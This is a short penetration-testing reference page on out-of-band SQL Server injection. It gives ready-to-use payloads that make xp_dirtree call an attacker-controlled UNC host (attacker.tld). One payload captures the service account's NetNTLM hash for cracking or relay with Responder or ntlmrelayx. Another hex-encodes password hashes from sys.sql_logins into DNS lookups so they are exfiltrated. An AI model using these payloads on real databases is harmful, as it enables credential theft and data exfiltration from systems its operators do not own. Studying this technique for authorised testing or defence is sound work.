---
title: "Out-of-band exfiltration and hash capture from MSSQL injection"
description: "Using xp_dirtree and related UNC procedures in SQL Server to exfiltrate data over DNS and capture the service account's NetNTLM hash."
keywords:
  - out of band
  - xp_dirtree
  - UNC path
  - NetNTLM capture
  - DNS exfiltration
---

# Out-of-band

When nothing is reflected and timing is slow, SQL Server can be made to reach the network. Several extended procedures take a path argument and resolve it, so pointing one at an attacker UNC path triggers a DNS lookup and an SMB connection, which exfiltrates data in the hostname and leaks the service account's NetNTLM hash.

`xp_dirtree` is the common choice (often executable by lower-privileged logins, unlike `xp_cmdshell`):

```sql
'; EXEC master..xp_dirtree '\\attacker.tld\x'-- 
```

The SQL Server service account authenticates to the attacker SMB listener, and a tool such as Responder captures its NetNTLMv2 hash for cracking or relay. `xp_fileexist` and `xp_subdirs` behave the same way.

To carry data rather than just a credential, build the UNC hostname from the value to steal using dynamic SQL, so the attacker name server logs it over DNS:

```sql
'; DECLARE @d varchar(1024); SELECT @d=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins); EXEC('master..xp_dirtree "\\'+@d+'.attacker.tld\x"')-- 
```

The lookup of `<hex>.attacker.tld` reaches the attacker's name server (for example Burp Collaborator), revealing the value after decoding. Long or non-DNS-safe values are hex-encoded and split across labels. This route needs stacked queries for the dynamic version, and the hash-capture variant needs only `EXECUTE` on `xp_dirtree`, which makes it reachable even without `sysadmin`.

## Tools

- Responder
- impacket (`ntlmrelayx.py`)

## References

- Microsoft SQL Server Documentation: extended stored procedures
- OWASP Testing Guide: Testing for SQL Injection
